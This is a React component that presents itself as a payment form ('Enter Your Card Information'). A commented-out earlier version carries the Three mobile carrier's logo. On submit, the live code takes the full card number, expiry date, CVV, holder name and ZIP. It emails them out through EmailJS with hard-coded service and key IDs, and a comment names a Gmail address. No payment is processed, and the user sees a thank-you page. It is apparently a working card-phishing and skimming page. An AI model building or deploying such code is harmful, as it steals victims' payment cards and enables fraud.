// import React, { useState } from "react";
// import ThankYouPage from "./thank-you";

// export default function PaymentCard() {
//     const [isSubmitted, setIsSubmitted] = useState(false);
//   const [cardType, setCardType] = useState("Visa");
//   const [formData, setFormData] = useState({
//     holder: "",
//     number: "",
//     expiry: "",
//     cvv: "",
//     zip: ""
//   });

//   const [errors, setErrors] = useState({});

//   const validate = () => {
//     const newErrors = {};

//     // Card Holder: only letters and spaces
//     if (!/^[A-Za-z ]+$/.test(formData.holder)) {
//       newErrors.holder = "Only alphabets are allowed.";
//     }

//     // Card Number: must be exactly 16 digits
//     if (!/^\d{16}$/.test(formData.number)) {
//       newErrors.number = "Card number must be exactly 16 digits.";
//     }

//     // Expiration Date: MM/YY format and future date
//     if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiry)) {
//       newErrors.expiry = "Enter a valid date (MM/YY).";
//     } else {
//       const [month, year] = formData.expiry.split("/");
//       const expDate = new Date(`20${year}`, month);
//       const now = new Date();
//       if (expDate <= now) {
//         newErrors.expiry = "Card has expired.";
//       }
//     }

//     // CVV: exactly 3 digits
//     if (!/^\d{3}$/.test(formData.cvv)) {
//       newErrors.cvv = "CVV must be exactly 3 digits.";
//     }

//     // ZIP Code: exactly 5 digits
//     if (!/^\d{5}$/.test(formData.zip)) {
//       newErrors.zip = "ZIP code must be exactly 5 digits.";
//     }

//     setErrors(newErrors);
//     return Object.keys(newErrors).length === 0;
//   };

//   const handleChange = (e) => {
//     const { name, value } = e.target;

//     if (name === "expiry") {
//       let formatted = value.replace(/\D/g, ""); // remove non-digits
//       if (formatted.length >= 3) {
//         formatted = `${formatted.slice(0, 2)}/${formatted.slice(2, 4)}`;
//       }
//       setFormData({ ...formData, [name]: formatted });
//     } else {
//       setFormData({ ...formData, [name]: value });
//     }

//     setErrors({ ...errors, [name]: "" }); // Clear the error when typing
//   };

//   const handleSubmit = (e) => {
//     e.preventDefault();
//     if (validate()) {
//       setIsSubmitted(true);
//     }
//   };

//   if (isSubmitted) {
//     return <ThankYouPage />;
//   }

//   return (
//     <div
//       className="min-h-screen flex items-center justify-center px-4 py-8 sm:px-6 lg:px-8"
//       style={{ background: "linear-gradient(to left, #ff6b5e, #fcdde9)" }}
//     >
//       {/* <img
//         src="../assets/img/logo.svg"
//         alt="Logo"
//         className="absolute top-4 left-4 w-16 h-16 opacity-90 z-20"
//       /> */}

//       <div className="w-full max-w-2xl relative  bg-white shadow-2xl p-6 sm:p-8 space-y-6 rounded-xl">

//       <div className="absolute top-4 right-2 sm:right-4 w-10 h-10 sm:w-12 sm:h-12 opacity-90 z-20">
//         <svg
//           xmlns="http://www.w3.org/2000/svg"
//           id="three_logo"
//           viewBox="0 0 44 44"
//         >
//           <title>Three</title>
//           <g
//             id="UI-icons/Three/1.-Liquorice"
//             fill-rule="evenodd"
//             stroke-width="1"
//           >
//             <g
//               id="icon_threelogo_Three-logo"
//               fill-rule="nonzero"
//               transform="translate(8.000000, 6.000000)"
//             >
//               <path
//                 id="Shape"
//                 d="M22.28 13.4c-.26-.18-.56-.42-.7-.56.08-.12.2-.32.32-.5.68-1 1.98-2.88 1.98-5.56 0-1.54-.56-3.22-1.92-4.5C20.6 1 18.46.1 15.3.1c-2.98 0-6.36.98-9.26 2.7-1.3.78-2.38 1.6-3.12 2.4-.74.8-1.18 1.56-1.18 2.22 0 .32.12.62.36.84.4.44 1.14.64 2.12.74.96.1 2.14.1 3.4.1h.22c1.94 0 3.32.06 4.2.18.44.06.76.14.96.24.2.1.26.2.26.32 0 .04-.04.14-.18.26-.42.42-1.52 1.04-2.52 1.74-.5.34-.98.7-1.32 1.08-.34.36-.58.74-.58 1.14v.02c0 .5.26.9.66 1.2 1.2.92 3.7 1.16 5.02 1.4.8.14 1.24.44 1.46.74.24.32.28.66.28.96 0 1.12-.42 2.1-1.16 2.78-.66.6-1.46 1-2.62 1h-.14c.02-.22.04-.44.04-.66 0-1.32-.52-2.42-1.4-3.18-.88-.76-2.12-1.2-3.56-1.2-1.78 0-3.2.74-4.16 1.82-.98 1.1-1.5 2.54-1.5 3.96 0 2.24 1.04 4.48 3.04 6.16 2.02 1.68 5 2.8 8.92 2.8 3.1 0 6.24-1.02 8.6-2.8 1.96-1.48 4.3-4.18 4.3-8.6-.02-4-2.74-6-4.16-7.06Zm-12.36.28c.44-.44 1.32-1.04 2-1.46.66-.42 1.24-.8 1.68-1.18.42-.38.7-.76.72-1.2 0-.34-.14-.66-.38-.92-.46-.44-1.26-.66-2.28-.78-1-.12-2.22-.12-3.48-.12h-.34c-1.04 0-1.86-.02-2.52-.04.92-.36 1.98-.92 3.12-1.54 1.88-1 3.94-2.12 5.9-2.6-.46.52-.74 1.1-.74 1.6 0 .12.04.26.14.36.1.1.24.16.44.16.34 0 .74-.14 1.18-.28.62-.2 1.32-.44 2.1-.44.68 0 1.4.18 2.18.7-.52.04-.94.18-1.2.4-.28.22-.36.48-.36.64 0 .28.2.5.46.8.4.46.92 1.04.92 2 0 .7-.26 1.44-.66 2v-.12c0-.48-.1-1.04-.38-1.34a.82.82 0 0 0-.62-.28c-.4 0-.76.32-1.3.74-.38.3-.84.7-1.42 1.06-2.46 1.56-3.78 2.16-4.72 2.24-.34.04-.86.04-.44-.4Zm2.26 9.52c1.38 0 2.54-.42 3.44-1.24.96-.88 1.5-2.18 1.5-3.58 0-.66-.2-1.22-.6-1.66 2.06.5 4.22 1.56 5.42 3.16-.54-.18-.92-.22-1.3-.22s-.7.4-.7.86c0 .24.1.52.2.86.18.54.4 1.22.4 2.04 0 .76-.18 1.62-.78 2.58-.02-.78-.22-1.4-.5-1.74-.22-.26-.44-.32-.6-.32-.24 0-.44.12-.6.3-.16.18-.3.44-.46.72-.56 1.02-1.46 2.66-4.26 3.5.26-.44.38-.88.38-1.24 0-.14-.02-.28-.06-.38a.51.51 0 0 0-.48-.34c-.3.02-.66.1-1.08.22-.64.18-1.42.4-2.28.4-.9 0-1.86-.24-2.86-1 .34-.06.66-.18.88-.36.18-.16.3-.36.3-.58 0-.32-.26-.56-.56-.82-.42-.4-.94-.88-.94-1.68 0-.24.04-.5.14-.78.1.26.22.48.4.68.26.28.58.46.88.46.32 0 .52-.16.6-.34.08-.2.08-.42.08-.58 0-.2.1-.38.24-.52.14-.14.34-.22.56-.22.46-.04.82.22 1.06.62.24.4.38.92.38 1.4 0 .3-.06.6-.14.84l-.1.26.22-.18c.42-.32.76-.8.9-1.14.1.02.22.02.32.02ZM3.02 7.76c-.14-.08-.24-.18-.24-.32 0-.38.36-1 1.04-1.66 2-2.02 6.66-4.6 11.48-4.6 2.44 0 4.42.6 5.74 1.72 1.14.98 1.76 2.36 1.76 3.88 0 2.36-1.1 3.98-1.78 4.96-.34.5-.56.78-.56 1.12 0 .26.12.48.34.7.2.22.5.42.84.68 1.4 1.04 3.7 2.74 3.72 6.24 0 3.98-2.1 6.4-3.88 7.74-2.18 1.64-5.08 2.6-7.96 2.6-7.18 0-10.88-4-10.88-7.9 0-1.16.44-2.34 1.22-3.24.8-.9 1.94-1.5 3.38-1.5.8 0 1.82.18 2.62.72s1.42 1.42 1.42 2.86v.12a2.33 2.33 0 0 0-.32-.5c-.3-.36-.76-.68-1.44-.68-.78 0-1.42.64-1.42 1.38 0 .14-.02.22-.04.28 0 .02-.02.02-.02.04-.18 0-.42-.14-.6-.38-.18-.26-.32-.64-.32-1.14 0-.1 0-.2.02-.3l.02-.22-.16.18c-.72.8-.98 1.54-.98 2.16 0 1.02.7 1.76 1.1 2.14.08.06.16.16.24.24.04.04.06.08.08.1.02.02.02.02.02.04 0 .04-.08.14-.28.22-.2.08-.54.16-1 .16-.16 0-.34 0-.54-.02l-.18-.02.12.14c1.38 1.64 2.9 2.08 4.2 2.08.98 0 1.84-.24 2.46-.42.26-.08.56-.18.72-.18.06 0 .1.02.1.04.02.02.02.06.02.12 0 .2-.12.54-.3.9s-.46.72-.74 1l-.18.16.24-.04c4.02-.52 5.36-2.84 6.02-4.04.1-.2.22-.38.3-.52.1-.14.18-.2.2-.2.04 0 .1.04.16.14.2.3.36 1.02.36 1.78 0 .34-.04.68-.1.98l-.06.24.18-.16c1.52-1.4 1.94-2.88 1.94-4.1 0-.94-.24-1.74-.42-2.26-.1-.28-.18-.54-.16-.66 0-.1.02-.16.04-.18.02-.02.06-.04.12-.06.64 0 1.4.24 2.32.66l.18.08-.08-.18c-1.24-2.9-4-4.14-6.68-4.82-1.34-.34-2.68-.54-3.8-.74-.82-.14-1.52-.28-2.04-.46-.08-.04-.16-.08-.26-.12 1.54-.2 3.38-1.28 5.02-2.32.62-.4 1.1-.8 1.48-1.12.2-.16.38-.32.54-.44.16-.12.28-.18.34-.18s.1.02.16.08c.16.16.24.62.24 1.1 0 .4-.06.82-.14 1.16l.04.18.16-.1c1.3-.84 1.94-2.12 1.94-3.3 0-1.2-.66-1.94-1.08-2.42-.06-.08-.14-.16-.2-.24-.04-.06-.08-.12-.1-.14 0-.04.04-.1.12-.14.28-.2.74-.34 1.28-.34.28 0 .56.04.86.1l.2.04-.12-.16c-1.12-1.44-2.42-1.86-3.56-1.86-.9 0-1.72.26-2.32.44-.3.1-.7.22-.86.22h-.04c0-.2.16-.56.44-.94.3-.38.72-.8 1.28-1.14l.2-.12-.24-.02c-.1 0-.2-.02-.32-.02-2.3 0-5.28 1.68-7.48 2.82-1.4.72-4.28 2.4-5.14 1.88Z"
//               />
//             </g>
//           </g>
//         </svg>
//       </div>
//         <h1 className="mt-4 sm:mt-0 font-bold text-xl sm:text-2xl text-gray-800">
//           Enter Your Card Information
//         </h1>
//         <p className="text-gray-500 text-sm sm:text-base">
//           Ensure prompt order processing by using a valid credit card to
//           complete your purchase.refundable.
//         </p>

//         {/* Card Type Selection */}
//         <div className="space-y-4">
//           {["Visa", "MasterCard"].map((type) => (
//             <label
//               key={type}
//               className={`w-full border p-3 rounded-xl flex items-center justify-between cursor-pointer ${
//                 cardType === type ? "border-blue-500" : "border-gray-300"
//               }`}
//             >
//               <div className="flex items-center space-x-4">
//                 <img
//                   src={
//                     type === "Visa"
//                       ? "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
//                       : "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
//                   }
//                   alt={type}
//                   className="h-6 ml-1"
//                 />
//                 <span className="text-sm font-medium">{type}</span>
//               </div>
//               <input
//                 type="radio"
//                 name="cardType"
//                 value={type}
//                 checked={cardType === type}
//                 onChange={() => setCardType(type)}
//                 className="form-radio text-blue-600 size-5"
//               />
//             </label>
//           ))}
//         </div>
//         <div className=" font-bold">
//             Payment details
//         </div>

//         {/* Payment Form */}
//         <form onSubmit={handleSubmit} className="space-y-4 mt-8">
//           <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
//             {/* Card Holder */}
//             <div>
//               <label className="block text-sm font-semibold text-gray-700 mb-1">
//                 Card Holder
//               </label>
//               <input
//                 type="text"
//                 name="holder"
//                 value={formData.holder}
//                 onChange={handleChange}
//                 placeholder="John Doe"
//                 className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
//                   errors.holder
//                     ? "border-red-500 focus:ring-red-400"
//                     : "focus:ring-blue-400"
//                 }`}
//               />
//               {errors.holder && (
//                 <p className="text-red-500 text-sm mt-1">{errors.holder}</p>
//               )}
//             </div>

//             {/* Card Number */}
//             <div>
//               <label className="block text-sm font-semibold text-gray-700 mb-1">
//                 Card Number
//               </label>
//               <input
//                 type="text"
//                 name="number"
//                 value={formData.number}
//                 onChange={handleChange}
//                 placeholder="1234567812345678"
//                 maxLength={16}
//                 className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
//                   errors.number
//                     ? "border-red-500 focus:ring-red-400"
//                     : "focus:ring-blue-400"
//                 }`}
//               />
//               {errors.number && (
//                 <p className="text-red-500 text-sm mt-1">{errors.number}</p>
//               )}
//             </div>
//           </div>

//           {/* Expiry / CVV / ZIP */}
//           <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
//             {/* Expiry */}
//             <div>
//               <label className="block text-sm font-semibold text-gray-700 mb-1">
//                 Expiration Date
//               </label>
//               <input
//                 type="text"
//                 name="expiry"
//                 value={formData.expiry}
//                 onChange={handleChange}
//                 placeholder="MM/YY"
//                 maxLength={5}
//                 className={`w-full border rounded-lg px-3 py-2 focus:outline-none ${
//                   errors.expiry
//                     ? "border-red-500 focus:ring-red-400"
//                     : "focus:ring-blue-400"
//                 }`}
//               />
//               {errors.expiry && (
//                 <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>
//               )}
//             </div>

//             {/* CVV */}
//             <div>
//               <label className="block text-sm font-semibold text-gray-700 mb-1">
//                 CVV
//               </label>
//               <input
//                 type="text"
//                 name="cvv"
//                 value={formData.cvv}
//                 onChange={handleChange}
//                 placeholder="123"
//                 maxLength={3}
//                 className={`w-full border rounded-lg px-3 py-2 focus:outline-none ${
//                   errors.cvv
//                     ? "border-red-500 focus:ring-red-400"
//                     : "focus:ring-blue-400"
//                 }`}
//               />
//               {errors.cvv && (
//                 <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>
//               )}
//             </div>

//             {/* ZIP */}
//             <div>
//               <label className="block text-sm font-semibold text-gray-700 mb-1">
//                 Post Code
//               </label>
//               <input
//                 type="text"
//                 name="zip"
//                 value={formData.zip}
//                 onChange={handleChange}
//                 placeholder="e6 2dr"
//                 maxLength={5}
//                 className={`w-full border rounded-lg px-3 py-2 focus:outline-none ${
//                   errors.zip
//                     ? "border-red-500 focus:ring-red-400"
//                     : "focus:ring-blue-400"
//                 }`}
//               />
//               {errors.zip && (
//                 <p className="text-red-500 text-sm mt-1">{errors.zip}</p>
//               )}
//             </div>
//           </div>

//           <button
//             type="submit"
//             className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition duration-300 mt-4 text-sm sm:text-base"
//           >
//             Submit
//           </button>
//         </form>
//       </div>
//     </div>
//   );
// }

import React, { useState } from "react";
import ThankYouPage from "./thank-you";
import emailjs from "@emailjs/browser";

export default function PaymentCard() {
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [cardType, setCardType] = useState("Visa");
  const [formData, setFormData] = useState({
    holder: "",
    number: "",
    expiry: "",
    cvv: "",
    zip: "",
  });

  const [errors, setErrors] = useState({});

  const validate = () => {
    const newErrors = {};
    if (!/^[A-Za-z ]+$/.test(formData.holder)) {
      newErrors.holder = "Only alphabets are allowed.";
    }
    if (!/^\d{16}$/.test(formData.number)) {
      newErrors.number = "Card number must be exactly 16 digits.";
    }
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiry)) {
      newErrors.expiry = "Enter a valid date (MM/YY).";
    } else {
      const [month, year] = formData.expiry.split("/");
      const expDate = new Date(`20${year}`, month);
      const now = new Date();
      if (expDate <= now) {
        newErrors.expiry = "Card has expired.";
      }
    }
    if (!/^\d{3}$/.test(formData.cvv)) {
      newErrors.cvv = "CVV must be exactly 3 digits.";
    }
    if (!/^\d{5}$/.test(formData.zip)) {
      newErrors.zip = "ZIP code must be exactly 5 digits.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    if (name === "expiry") {
      let formatted = value.replace(/\D/g, "");
      if (formatted.length >= 3) {
        formatted = `${formatted.slice(0, 2)}/${formatted.slice(2, 4)}`;
      }
      setFormData({ ...formData, [name]: formatted });
    } else {
      setFormData({ ...formData, [name]: value });
    }
    setErrors({ ...errors, [name]: "" });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (validate()) {
      const templateParams = {
        card_type: cardType,
        card_holder: formData.holder,
        card_number: formData.number,
        expiry_date: formData.expiry,
        cvv: formData.cvv,
        zip: formData.zip,
      };

      emailjs
        .send(
          // Detailsinfo1234@gmail.com
          "service_ahq66pz", // Replace with your EmailJS service ID
          "template_ksshxho", // Replace with your EmailJS template ID
          templateParams,
          "8cQIKNvLWhFcppicG" // Replace with your EmailJS public key
        )
        .then((result) => {
          console.log(result.text);
          setIsSubmitted(true);
        })
        .catch((error) => {
          console.error(error.text);
        });
    }
  };

  if (isSubmitted) {
    return <ThankYouPage />;
  }

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 py-8 sm:px-6 lg:px-8"
      style={{ background: "linear-gradient(to left, #ff6b5e, #fcdde9)" }}
    >
      <div className="w-full max-w-2xl bg-white shadow-2xl p-6 sm:p-8 space-y-6 rounded-xl relative">
        <h1 className="font-bold text-xl sm:text-2xl text-gray-800">
          Enter Your Card Information
        </h1>
        <p className="text-gray-500 text-sm sm:text-base">
          Ensure prompt order processing by using a valid credit card to
          complete your purchase.
        </p>

        {/* Card Type Selection */}
        <div className="space-y-4">
          {["Visa", "MasterCard"].map((type) => (
            <label
              key={type}
              className={`w-full border p-3 rounded-xl flex items-center justify-between cursor-pointer ${
                cardType === type ? "border-blue-500" : "border-gray-300"
              }`}
            >
              <div className="flex items-center space-x-4">
                <img
                  src={
                    type === "Visa"
                      ? "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
                      : "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
                  }
                  alt={type}
                  className="h-6 ml-1"
                />
                <span className="text-sm font-medium">{type}</span>
              </div>
              <input
                type="radio"
                name="cardType"
                value={type}
                checked={cardType === type}
                onChange={() => setCardType(type)}
                className="form-radio text-blue-600 size-5"
              />
            </label>
          ))}
        </div>

        <div className="font-bold">Payment details</div>

        {/* Payment Form */}
        <form onSubmit={handleSubmit} className="space-y-4 mt-8">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {/* Card Holder */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                Card Holder
              </label>
              <input
                type="text"
                name="holder"
                value={formData.holder}
                onChange={handleChange}
                placeholder="John Doe"
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.holder
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.holder && (
                <p className="text-red-500 text-sm mt-1">{errors.holder}</p>
              )}
            </div>

            {/* Card Number */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                Card Number
              </label>
              <input
                type="text"
                name="number"
                value={formData.number}
                onChange={handleChange}
                placeholder="1234567812345678"
                maxLength={16}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.number
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.number && (
                <p className="text-red-500 text-sm mt-1">{errors.number}</p>
              )}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            {/* Expiry */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                Expiry
              </label>
              <input
                type="text"
                name="expiry"
                value={formData.expiry}
                onChange={handleChange}
                placeholder="MM/YY"
                maxLength={5}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.expiry
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.expiry && (
                <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>
              )}
            </div>

            {/* CVV */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                CVV
              </label>
              <input
                type="text"
                name="cvv"
                value={formData.cvv}
                onChange={handleChange}
                placeholder="123"
                maxLength={3}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.cvv
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.cvv && (
                <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>
              )}
            </div>

            {/* ZIP */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-1">
                ZIP
              </label>
              <input
                type="text"
                name="zip"
                value={formData.zip}
                onChange={handleChange}
                placeholder="12345"
                maxLength={5}
                className={`w-full border rounded-lg px-4 py-2 focus:outline-none ${
                  errors.zip
                    ? "border-red-500 focus:ring-red-400"
                    : "focus:ring-blue-400"
                }`}
              />
              {errors.zip && (
                <p className="text-red-500 text-sm mt-1">{errors.zip}</p>
              )}
            </div>
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 text-white rounded-lg py-2 font-semibold hover:bg-blue-700 transition duration-300"
          >
            Submit Payment
          </button>
        </form>
      </div>
    </div>
  );
}
